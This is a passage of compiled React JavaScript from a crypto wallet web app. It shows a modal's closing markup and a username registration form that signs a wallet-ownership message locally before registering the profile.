			className: "w-full max-w-md glass-strong rounded-2xl p-6 shadow-elev",
			children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "flex items-center justify-between mb-4",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
					className: "font-display text-lg font-semibold",
					children: title
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
					onClick: onClose,
					className: "rounded-md p-1.5 hover:bg-white/10 text-muted-foreground",
					children: "✕"
				})]
			}), children]
		})
	});
}
function UsernameForm({ wallet, mode, onDone }) {
	const address = wallet.addresses.find((a) => a.chain === "ETH")?.address ?? wallet.addresses[0]?.address ?? "";
	const [username, setUsername] = (0, import_react.useState)("");
	const [busy, setBusy] = (0, import_react.useState)(true);
	const [err, setErr] = (0, import_react.useState)(null);
	const [existing, setExisting] = (0, import_react.useState)(null);
	(0, import_react.useEffect)(() => {
		let cancelled = false;
		(async () => {
			try {
				const found = await lookupProfileByAddress(address);
				if (cancelled) return;
				if (found) {
					setExisting(found.username);
					setUsername(found.username);
				}
			} catch (e) {
				if (!cancelled) setErr(e instanceof Error ? e.message : "Lookup failed");
			} finally {
				if (!cancelled) setBusy(false);
			}
		})();
		return () => {
			cancelled = true;
		};
	}, [address]);
	const submit = async (e) => {
		e.preventDefault();
		setErr(null);
		const clean = username.trim();
		if (existing) {
			onDone(existing);
			return;
		}
		if (!/^[A-Za-z0-9_]{3,24}$/.test(clean)) {
			setErr("3–24 chars, letters/numbers/underscore only.");
			return;
		}
		setBusy(true);
		try {
			if (await isUsernameTaken(clean)) {
				setErr("That username is taken.");
				setBusy(false);
				return;
			}
			if (!wallet.mnemonic) throw new Error("Re-import this wallet to prove ownership.");
			onDone((await registerWalletProfile(address, clean, await signWalletOwnership(address, await derivePrivateKeyFromMnemonic(wallet.mnemonic), "register", clean))).username);
		} catch (e) {
			setErr(e instanceof Error ? e.message : "Failed to register username");
			setBusy(false);
		}
	};
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("form", {
		onSubmit: submit,
		className: "space-y-4",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "rounded-lg glass p-3 text-xs text-muted-foreground",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
					className: "uppercase tracking-widest text-[10px] mb-1",
					children: "Wallet address"
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
					className: "font-mono break-all text-foreground/90",
					children: address
				})]
			}),
			existing ? /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "rounded-lg border border-success/30 bg-success/10 p-3 text-xs text-success-foreground/90 flex gap-2",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Check, { className: "h-4 w-4 shrink-0 text-success mt-0.5" }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", { children: [
					"This wallet is already registered as",
					" ",
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
						className: "font-semibold text-foreground",
						children: existing
					}),
					". Continue to sign in."
				] })]
			}) : /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
				className: "block",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
						className: "text-xs uppercase tracking-widest text-muted-foreground",
						children: mode === "create" ? "Pick a username" : "Register a username for this wallet"
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
						autoFocus: true,
						value: username,
						onChange: (e) => setUsername(e.target.value),
						placeholder: "e.g. satoshi_42",
						className: "mt-1 w-full glass rounded-lg px-3 py-2.5 text-sm outline-none focus:ring-2 focus:ring-ring"
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
						className: "mt-1 block text-[11px] text-muted-foreground",
						children: "Public. Used to log in whenever this wallet is active."
					})
				]
			}),
			err && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-xs text-destructive",
				children: err
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
				disabled: busy,
				className: "inline-flex w-full items-center justify-center gap-2 rounded-lg bg-[image:var(--gradient-brand)] py-2.5 text-sm font-semibold text-primary-foreground shadow-glow disabled:opacity-60",
				children: [busy ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoaderCircle, { className: "h-4 w-4 animate-spin" }) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(LogIn, { className: "h-4 w-4" }), existing ? "Sign in" : "Register & sign in"]
			})
		]
	});
}
//#endregion
export { WalletPage as component };
